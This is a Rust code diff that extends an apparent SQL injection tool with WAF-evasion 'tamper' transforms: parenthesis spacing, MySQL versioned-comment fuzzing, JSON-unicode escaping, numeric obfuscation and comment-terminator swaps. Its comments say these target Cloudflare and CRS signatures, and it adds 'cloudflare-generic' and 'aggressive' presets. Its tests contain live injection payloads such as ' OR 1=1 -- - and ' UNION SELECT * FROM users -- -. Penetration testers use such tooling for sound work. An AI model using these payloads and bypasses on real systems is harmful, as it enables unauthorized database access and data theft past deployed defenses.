@@ -52,6 +52,24 @@ pub enum Tamper {
     /// Whole payload → Base64 (opaque to the backend unless it decodes;
     /// **breaks boolean TRUE/FALSE differentials**, see [`Tamper::is_boolean_safe`])
     Base64Encode,
+    /// `" "` → `(` separator with balancing `)` (`' OR 1=1` → `'OR(1=1)`;
+    /// spaces adjacent to quotes/operators are dropped, alnum–alnum gaps
+    /// get `(`). Deterministic, no spaces left in the body.
+    Space2Paren,
+    /// Seeded MySQL version fuzz: `SELECT` → `/*!<V>SELECT*/` or
+    /// `/**!<V>SELECT*/` with `<V>` drawn from
+    /// `0/32302/50000/80000/99999` (Cloudflare/CRS signature diversity).
+    VersionedFuzz,
+    /// `"` → `\u0022`, `'` → `\u0027`, ` ` → `\u0020`, `/` → `\u002f`
+    /// (JSON-unicode escapes; trailing line-comment terminator preserved).
+    JsonUnicodeEscape,
+    /// Seeded numeric obfuscation: integer literals → `{n}e0` (`1=1` →
+    /// `1e0=1e0`) or ASCII-hex (`1` → `0x31`); equality coherence keeps
+    /// TRUE/FALSE differentials valid either way.
+    NumericObfuscate,
+    /// Seeded trailing line-comment swap: `-- -`/`--`/`#...` → `--+`,
+    /// `%23` or `;/*` (Cloudflare/CRS terminator signatures).
+    LineComment,
 }
 
 impl Tamper {
@@ -77,6 +95,11 @@ impl Tamper {
             Self::EqualToLike => "equaltolike",
             Self::VersionedMoreKeywords => "versionedmorekeywords",
             Self::Base64Encode => "base64encode",
+            Self::Space2Paren => "space2paren",
+            Self::VersionedFuzz => "versionedfuzz",
+            Self::JsonUnicodeEscape => "jsonunicodeescape",
+            Self::NumericObfuscate => "numericobfuscate",
+            Self::LineComment => "linecomment",
         }
     }
 
@@ -104,6 +127,15 @@ impl Tamper {
                 Some(Self::VersionedMoreKeywords)
             }
             "base64encode" | "base64" | "b64" => Some(Self::Base64Encode),
+            "space2paren" | "spaceparen" | "paren" => Some(Self::Space2Paren),
+            "versionedfuzz" | "versionedrandom" | "fuzzversioned" => Some(Self::VersionedFuzz),
+            "jsonunicodeescape" | "jsonunicode" | "jsonescape" => Some(Self::JsonUnicodeEscape),
+            "numericobfuscate" | "equalobfuscate" | "numeric" | "numericfuzz" => {
+                Some(Self::NumericObfuscate)
+            }
+            "linecomment" | "linecommentfuzz" | "commentfuzz" | "trailingcomment" => {
+                Some(Self::LineComment)
+            }
             _ => None,
         }
     }
@@ -130,6 +162,11 @@ impl Tamper {
             "equaltolike",
             "versionedmorekeywords",
             "base64encode",
+            "space2paren",
+            "versionedfuzz",
+            "jsonunicodeescape",
+            "numericobfuscate",
+            "linecomment",
         ]
     }
 
@@ -256,12 +293,22 @@ impl Tamper {
                 use base64::Engine as _;
                 base64::engine::general_purpose::STANDARD.encode(payload.as_bytes())
             }
+            Self::Space2Paren => apply_space2paren(payload),
+            Self::VersionedFuzz => apply_versioned_fuzz(payload, rng),
+            Self::JsonUnicodeEscape => apply_json_unicode_escape(payload),
+            Self::NumericObfuscate => apply_numeric_obfuscate(payload, rng),
+            Self::LineComment => apply_linecomment(payload, rng),
         }
     }
 }
 
 /// Parse a comma-separated tamper list (e.g. `"space2comment,randomcase"`).
 /// Unknown names are ignored with a `tracing::warn!`; empty input yields `Vec::new()`.
+///
+/// Preset aliases (expanded inline, case-insensitive, never in
+/// [`Tamper::all_names`]):
+/// - `"cloudflare-generic"` → `randomcase,space2comment,versionedmorekeywords`
+/// - `"aggressive"` → `randomcase,space2paren,versionedfuzz,equaltolike`
 #[must_use]
 pub fn parse_tamper_list(input: Option<&str>) -> Vec<Tamper> {
     let Some(raw) = input else {
@@ -271,19 +318,32 @@ pub fn parse_tamper_list(input: Option<&str>) -> Vec<Tamper> {
     if trimmed.is_empty() || trimmed.eq_ignore_ascii_case("none") {
         return Vec::new();
     }
-    trimmed
-        .split(',')
-        .filter_map(|part| {
-            let name = part.trim();
-            if name.is_empty() {
-                return None;
-            }
-            if let Some(t) = Tamper::from_name(name) { Some(t) } else {
-                tracing::warn!(tamper=%name, available=?Tamper::all_names(), "unknown tamper ignored");
-                None
-            }
-        })
-        .collect()
+    let mut out = Vec::new();
+    for part in trimmed.split(',') {
+        let name = part.trim();
+        if name.is_empty() {
+            continue;
+        }
+        if name.eq_ignore_ascii_case("cloudflare-generic") {
+            out.extend([
+                Tamper::RandomCase,
+                Tamper::Space2Comment,
+                Tamper::VersionedMoreKeywords,
+            ]);
+        } else if name.eq_ignore_ascii_case("aggressive") {
+            out.extend([
+                Tamper::RandomCase,
+                Tamper::Space2Paren,
+                Tamper::VersionedFuzz,
+                Tamper::EqualToLike,
+            ]);
+        } else if let Some(t) = Tamper::from_name(name) {
+            out.push(t);
+        } else {
+            tracing::warn!(tamper=%name, available=?Tamper::all_names(), "unknown tamper ignored");
+        }
+    }
+    out
 }
 
 /// Apply a sequence of tampers in order. Empty slice returns `payload` unchanged.
@@ -642,6 +702,143 @@ fn apply_between_comment(payload: &str) -> String {
     .into_owned()
 }
 
+/// Space → parenthesis separator (`' OR 1=1` → `'OR(1=1)`).
+///
+/// Deterministic (no RNG): every `' '` in the body is either dropped (no
+/// separator needed — at least one side is an operator/quote/paren, or a
+/// `digit→letter` boundary like `1 AND` which lexes apart, except `e`/`E`
+/// which would start scientific notation) or replaced with `(` (alnum–alnum
+/// gaps like `OR 1` that would otherwise merge into one token). Inserted
+/// `(` are balanced by appending `)` before the trailing line-comment
+/// terminator (preserved verbatim via [`split_trailing_comment`]).
+fn apply_space2paren(payload: &str) -> String {
+    fn is_word(ch: char) -> bool {
+        ch.is_alphanumeric() || ch == '_'
+    }
+    let (body, tail) = split_trailing_comment(payload);
+    if !body.contains(' ') {
+        return payload.to_owned();
+    }
+    let chars: Vec<char> = body.chars().collect();
+    let mut out = String::with_capacity(body.len() + 8);
+    let mut prev: Option<char> = None;
+    let mut open: usize = 0;
+    for (i, &ch) in chars.iter().enumerate() {
+        if ch != ' ' {
+            out.push(ch);
+            prev = Some(ch);
+            continue;
+        }
+        let Some(p) = prev else {
+            continue; // leading space: drop
+        };
+        let Some(&nxt) = chars.get(i + 1) else {
+            continue; // trailing space of the body (before `tail`): drop
+        };
+        if nxt == ' ' {
+            continue; // collapse runs: re-evaluate against the next real char
+        }
+        if is_word(p) && is_word(nxt) {
+            // `1 AND` (digit→letter, except `e`/`E`) lexes apart on its own.
+            if p.is_ascii_digit() && nxt.is_ascii_alphabetic() && !matches!(nxt, 'e' | 'E') {
+                continue;
+            }
+            out.push('(');
+            open += 1;
+            prev = Some('(');
+        }
+        // else: operator/quote/paren on at least one side delimits — drop.
+    }
+    for _ in 0..open {
+        out.push(')');
+    }
+    out.push_str(tail);
+    out
+}
+
+/// Seeded MySQL version fuzz: wraps the same keyword set as
+/// [`Tamper::VersionedComment`] but draws one `<V>` per payload from
+/// `0/32302/50000/80000/99999` plus one `/*!` vs `/**!` opening per payload
+/// from `rng`, so `--seed` replays byte-identical output.
+fn apply_versioned_fuzz(payload: &str, rng: &mut impl rand::Rng) -> String {
+    static VERSIONS: &[&str] = &["0", "32302", "50000", "80000", "99999"];
+    let Some(re) = keyword_regex() else {
+        return payload.to_owned();
+    };
+    let version = VERSIONS[rng.random_range(0..VERSIONS.len())];
+    let opener = if rng.random_bool(0.5) { "/**!" } else { "/*!" };
+    re.replace_all(payload, |caps: &regex::Captures| {
+        let m = &caps[0];
+        format!("{opener}{version}{m}*/")
+    })
+    .into_owned()
+}
+
+/// JSON-unicode escapes for WAF-visible chars, applied to the body only
+/// (trailing `-- ...`/`#...` terminator preserved verbatim). Digits are
+/// untouched, so TRUE (`1`) vs FALSE (`2`) stay distinct.
+fn apply_json_unicode_escape(payload: &str) -> String {
+    let (body, tail) = split_trailing_comment(payload);
+    let mut out = String::with_capacity(body.len() + 16);
+    for ch in body.chars() {
+        match ch {
+            '"' => out.push_str("\\u0022"),
+            '\'' => out.push_str("\\u0027"),
+            ' ' => out.push_str("\\u0020"),
+            '/' => out.push_str("\\u002f"),
+            _ => out.push(ch),
+        }
+    }
+    out.push_str(tail);
+    out
+}
+
+fn integer_literal_regex() -> Option<&'static Regex> {
+    static RE: OnceLock<Option<Regex>> = OnceLock::new();
+    RE.get_or_init(|| Regex::new(r"\b\d+\b").ok()).as_ref()
+}
+
+/// Seeded numeric obfuscation over the body (terminator preserved).
+/// One style per payload from `rng`: `{n}e0` (`1=1` → `1e0=1e0`, value
+/// preserving) or ASCII-hex (`1` → `0x31`, equality preserving). Both keep
+/// `TRUE == TRUE` and `TRUE != FALSE`, whatever each branch draws.
+fn apply_numeric_obfuscate(payload: &str, rng: &mut impl rand::Rng) -> String {
+    let (body, tail) = split_trailing_comment(payload);
+    let Some(re) = integer_literal_regex() else {
+        return payload.to_owned();
+    };
+    let hex_style = rng.random_bool(0.5);
+    let replaced = re
+        .replace_all(body, |caps: &regex::Captures| {
+            let n = &caps[0];
+            if hex_style {
+                let mut h = String::with_capacity(2 + n.len() * 2);
+                h.push_str("0x");
+                for b in n.bytes() {
+                    let _ = write!(h, "{b:02x}");
+                }
+                h
+            } else {
+                format!("{n}e0")
+            }
+        })
+        .into_owned();
+    format!("{replaced}{tail}")
+}
+
+/// Seeded trailing line-comment swap. Without a `split_trailing_comment`
+/// tail the payload is returned unchanged (still boolean-safe: both
+/// branches stay distinct).
+fn apply_linecomment(payload: &str, rng: &mut impl rand::Rng) -> String {
+    static VARIANTS: &[&str] = &["--+", "%23", ";/*"];
+    let (body, tail) = split_trailing_comment(payload);
+    if tail.is_empty() {
+        return payload.to_owned();
+    }
+    let variant = VARIANTS[rng.random_range(0..VARIANTS.len())];
+    format!("{body}{variant}")
+}
+
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used)]
 mod tests {
@@ -948,7 +1145,7 @@ mod tests {
             );
             assert!(Tamper::from_name(name).is_some());
         }
-        assert_eq!(Tamper::all_names().len(), 19);
+        assert_eq!(Tamper::all_names().len(), 24);
     }
 
     #[test]
@@ -1202,5 +1399,310 @@ mod tests {
         let spaced = Tamper::Space2Newline.apply("' UNION SELECT 1 -- -");
         assert!(!spaced.contains(' '), "got {spaced}");
         assert!(spaced.contains("%0a"), "got {spaced}");
+    }
+
+    // ── Phase 1 P0 tampers ──────────────────────────────────────────
+
+    #[test]
+    fn p0_tampers_registered_with_aliases() {
+        for name in [
+            "space2paren",
+            "versionedfuzz",
+            "jsonunicodeescape",
+            "numericobfuscate",
+            "linecomment",
+        ] {
+            assert!(
+                Tamper::all_names().contains(&name),
+                "all_names missing {name}"
+            );
+            assert!(Tamper::from_name(name).is_some());
+        }
+        assert_eq!(Tamper::from_name("paren"), Some(Tamper::Space2Paren));
+        assert_eq!(
+            Tamper::from_name("equalobfuscate"),
+            Some(Tamper::NumericObfuscate)
+        );
+        assert_eq!(Tamper::from_name("numeric"), Some(Tamper::NumericObfuscate));
+        assert_eq!(
+            Tamper::from_name("jsonunicode"),
+            Some(Tamper::JsonUnicodeEscape)
+        );
+        assert_eq!(Tamper::from_name("commentfuzz"), Some(Tamper::LineComment));
+        for name in Tamper::all_names() {
+            let t = Tamper::from_name(name).expect("known tamper");
+            if t == Tamper::Base64Encode {
+                continue;
+            }
+            assert!(t.is_boolean_safe(), "{name} should be boolean-safe");
+        }
+    }
+
+    #[test]
+    fn space2paren_matches_or_paren_style() {
+        assert_eq!(Tamper::Space2Paren.apply("' OR 1=1"), "'OR(1=1)");
+        assert_eq!(Tamper::Space2Paren.apply("' OR 1=1 -- -"), "'OR(1=1)-- -");
+        assert_eq!(Tamper::Space2Paren.apply("1 AND 1=1"), "1AND(1=1)");
+        // no space left in the body part, terminator preserved verbatim
+        let out = Tamper::Space2Paren.apply("' OR 'a'='a' -- -");
+        assert!(out.ends_with("-- -"), "got {out}");
+        let body = out.split("--").next().unwrap_or("");
+        assert!(!body.contains(' '), "space left in body: {out}");
+        assert!(out.contains("'OR'"), "got {out}");
+        // balanced parens
+        assert_eq!(out.chars().filter(|&c| c == '(').count(), 0, "got {out}");
+        // payload without spaces is a no-op
+        assert_eq!(Tamper::Space2Paren.apply("nospace"), "nospace");
+    }
+
+    #[test]
+    fn space2paren_balances_inserted_parens() {
+        let out = Tamper::Space2Paren.apply("' OR 1=1");
+        assert_eq!(
+            out.chars().filter(|&c| c == '(').count(),
+            out.chars().filter(|&c| c == ')').count()
+        );
+        let out2 = Tamper::Space2Paren.apply("1 AND 1=1 -- -");
+        assert!(out2.ends_with("-- -"), "got {out2}");
+        let body2 = out2.split("--").next().unwrap_or("");
+        assert!(!body2.contains(' '), "got {out2}");
+    }
+
+    #[test]
+    fn space2paren_deterministic_across_seeds() {
+        use crate::seeded_rng::make_rng;
+        let mut a = make_rng(Some(1));
+        let mut b = make_rng(Some(999));
+        assert_eq!(
+            Tamper::Space2Paren.apply_with_rng("' OR 1=1 -- -", &mut a),
+            Tamper::Space2Paren.apply_with_rng("' OR 1=1 -- -", &mut b)
+        );
+    }
+
+    #[test]
+    fn versionedfuzz_wraps_with_seeded_version() {
+        use crate::seeded_rng::make_rng;
+        let mut rng = make_rng(Some(42));
+        let out = Tamper::VersionedFuzz.apply_with_rng("' OR 1=1 -- -", &mut rng);
+        assert!(out.contains("/*!") || out.contains("/**!"), "got {out}");
+        assert!(out.contains("*/"), "got {out}");
+        assert!(
+            ["0", "32302", "50000", "80000", "99999"]
+                .iter()
+                .any(|v| out.contains(v)),
+            "seeded version missing: {out}"
+        );
+        assert!(out.contains("1=1"), "TRUE marker must survive: {out}");
+    }
+
+    #[test]
+    fn versionedfuzz_same_seed_identical() {
+        use crate::seeded_rng::make_rng;
+        let payload = "' UNION SELECT 1,2 -- -";
+        let mut a = make_rng(Some(7));
+        let mut b = make_rng(Some(7));
+        assert_eq!(
+            Tamper::VersionedFuzz.apply_with_rng(payload, &mut a),
+            Tamper::VersionedFuzz.apply_with_rng(payload, &mut b)
+        );
+    }
+
+    #[test]
+    fn versionedfuzz_seeds_cover_multiple_versions() {
+        use crate::seeded_rng::make_rng;
+        use std::collections::HashSet;
+        let payload = "' UNION SELECT * FROM users -- -";
+        let mut distinct = HashSet::new();
+        for seed in 1..=12 {
+            let mut rng = make_rng(Some(seed));
+            distinct.insert(Tamper::VersionedFuzz.apply_with_rng(payload, &mut rng));
+        }
+        assert!(
+            distinct.len() >= 2,
+            "seeded fuzz should vary versions/openers across seeds"
+        );
+    }
+
+    #[test]
+    fn jsonunicodeescape_replaces_waf_visible_chars() {
+        let out = Tamper::JsonUnicodeEscape.apply("' OR 1=1 -- -");
+        assert!(out.ends_with("-- -"), "terminator preserved: {out}");
+        let body = out.split("--").next().unwrap_or("");
+        assert!(!body.contains('\''), "got {out}");
+        assert!(!body.contains('"'), "got {out}");
+        assert!(!body.contains(' '), "got {out}");
+        assert!(!body.contains('/'), "got {out}");
+        assert!(out.contains("\\u0027"), "got {out}");
+        assert!(out.contains("\\u0020"), "got {out}");
+        assert!(out.contains("1=1"), "digits survive: {out}");
+        // slash escaping
+        let slash = Tamper::JsonUnicodeEscape.apply("a/b");
+        assert_eq!(slash, "a\\u002fb");
+        // roundtrip: decoding restores the body
+        let decoded = body
+            .replace("\\u0022", "\"")
+            .replace("\\u0027", "'")
+            .replace("\\u0020", " ")
+            .replace("\\u002f", "/");
+        assert_eq!(decoded, "' OR 1=1 ");
+    }
+
+    #[test]
+    fn jsonunicodeescape_deterministic_across_seeds() {
+        use crate::seeded_rng::make_rng;
+        let mut a = make_rng(Some(1));
+        let mut b = make_rng(Some(2));
+        assert_eq!(
+            Tamper::JsonUnicodeEscape.apply_with_rng("' OR 'a'='a' -- -", &mut a),
+            Tamper::JsonUnicodeEscape.apply_with_rng("' OR 'a'='a' -- -", &mut b)
+        );
+    }
+
+    #[test]
+    fn numericobfuscate_emits_seeded_styles() {
+        use crate::seeded_rng::make_rng;
+        use std::collections::HashSet;
+        let mut styles = HashSet::new();
+        for seed in 1..=20 {
+            let mut rng = make_rng(Some(seed));
+            let out = Tamper::NumericObfuscate.apply_with_rng("' OR 1=1 -- -", &mut rng);
+            assert!(out.ends_with("-- -"), "terminator preserved: {out}");
+            assert!(!out.contains(" 1=1 "), "bare digits must go: {out}");
+            if out.contains("1e0=1e0") {
+                styles.insert("e0");
+            } else if out.contains("0x31=0x31") {
+                styles.insert("hex");
+            } else {
+                panic!("unexpected numeric style: {out}");
+            }
+        }
+        assert_eq!(styles.len(), 2, "both e0 and hex styles must occur");
+    }
+
+    #[test]
+    fn numericobfuscate_false_branch_coherent() {
+        use crate::seeded_rng::make_rng;
+        for seed in [1, 2, 3, 42] {
+            let mut rng = make_rng(Some(seed));
+            let f = Tamper::NumericObfuscate.apply_with_rng("' OR 1=2 -- -", &mut rng);
+            assert!(
+                f.contains("1e0=2e0") || f.contains("0x31=0x32"),
+                "FALSE coherence broken: {f}"
+            );
+        }
+    }
+
+    #[test]
+    fn numericobfuscate_same_seed_identical() {
+        use crate::seeded_rng::make_rng;
+        let mut a = make_rng(Some(11));
+        let mut b = make_rng(Some(11));
+        assert_eq!(
+            Tamper::NumericObfuscate.apply_with_rng("' OR 1=1 -- -", &mut a),
+            Tamper::NumericObfuscate.apply_with_rng("' OR 1=1 -- -", &mut b)
+        );
+    }
+
+    #[test]
+    fn linecomment_swaps_terminator_seeded() {
+        use crate::seeded_rng::make_rng;
+        use std::collections::HashSet;
+        let mut seen = HashSet::new();
+        for seed in 1..=12 {
+            let mut rng = make_rng(Some(seed));
+            let out = Tamper::LineComment.apply_with_rng("' OR 1=1 -- -", &mut rng);
+            assert!(out.contains("1=1"), "body preserved: {out}");
+            assert!(!out.contains("-- -"), "old terminator must go: {out}");
+            let tail_ok = out.ends_with("--+") || out.ends_with("%23") || out.ends_with(";/*");
+            assert!(tail_ok, "unexpected terminator: {out}");
+            seen.insert(out[out.len().saturating_sub(3)..].to_owned());
+        }
+        assert!(seen.len() >= 2, "seeded variants should vary: {seen:?}");
+    }
+
+    #[test]
+    fn linecomment_no_tail_is_noop() {
+        // No trailing comment: nothing to swap, payload untouched.
+        assert_eq!(Tamper::LineComment.apply("nospace"), "nospace");
+        assert_eq!(Tamper::LineComment.apply("' OR 1=1"), "' OR 1=1");
+    }
+
+    #[test]
+    fn linecomment_same_seed_identical() {
+        use crate::seeded_rng::make_rng;
+        let mut a = make_rng(Some(5));
+        let mut b = make_rng(Some(5));
+        assert_eq!(
+            Tamper::LineComment.apply_with_rng("' OR 1=1 -- -", &mut a),
+            Tamper::LineComment.apply_with_rng("' OR 1=1 -- -", &mut b)
+        );
+    }
+
+    #[test]
+    fn p0_tampers_preserve_true_false_differential() {
+        use crate::seeded_rng::make_rng;
+        let pairs = [
+            ("' OR 1=1 -- -", "' OR 1=2 -- -"),
+            ("' OR 'a'='a' -- -", "' OR 'a'='b' -- -"),
+        ];
+        let tampers = [
+            Tamper::Space2Paren,
+            Tamper::VersionedFuzz,
+            Tamper::JsonUnicodeEscape,
+            Tamper::NumericObfuscate,
+            Tamper::LineComment,
+        ];
+        for t in &tampers {
+            assert!(t.is_boolean_safe(), "{t:?} must be boolean-safe");
+            let mut rng = make_rng(Some(42));
+            for (true_p, false_p) in &pairs {
+                let a = t.apply_with_rng(true_p, &mut rng);
+                let b = t.apply_with_rng(false_p, &mut rng);
+                assert_ne!(a, b, "{t:?} collapsed differential for {true_p}");
+            }
+        }
+    }
+
+    #[test]
+    fn preset_cloudflare_generic_expands() {
+        assert_eq!(
+            parse_tamper_list(Some("cloudflare-generic")),
+            vec![
+                Tamper::RandomCase,
+                Tamper::Space2Comment,
+                Tamper::VersionedMoreKeywords,
+            ]
+        );
+        // case-insensitive, composes with other names
+        assert_eq!(
+            parse_tamper_list(Some("CloudFlare-Generic, hexencode")),
+            vec![
+                Tamper::RandomCase,
+                Tamper::Space2Comment,
+                Tamper::VersionedMoreKeywords,
+                Tamper::HexEncode,
+            ]
+        );
+    }
+
+    #[test]
+    fn preset_aggressive_expands() {
+        assert_eq!(
+            parse_tamper_list(Some("aggressive")),
+            vec![
+                Tamper::RandomCase,
+                Tamper::Space2Paren,
+                Tamper::VersionedFuzz,
+                Tamper::EqualToLike,
+            ]
+        );
+    }
+
+    #[test]
+    fn presets_are_aliases_not_variants() {
+        assert!(!Tamper::all_names().contains(&"cloudflare-generic"));
+        assert!(!Tamper::all_names().contains(&"aggressive"));
+        assert!(Tamper::from_name("cloudflare-generic").is_none());
+        assert!(Tamper::from_name("aggressive").is_none());
     }
 }
